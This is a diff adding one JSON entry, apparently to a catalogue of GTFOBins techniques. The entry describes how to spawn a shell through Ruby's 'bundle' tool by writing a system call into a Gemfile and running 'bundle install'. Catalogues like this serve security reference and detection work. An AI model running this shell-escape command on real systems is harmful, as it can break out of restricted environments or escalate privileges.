@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-bundle-shell-3",
+  "name": "GTFOBins · bundle (shell) #3",
+  "command": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install",
+  "description": "Use bundle to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "bundle",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/bundle/#shell",
+  "upstream_id": "bundle/shell/2",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/bundle/"
+    }
+  ]
+}
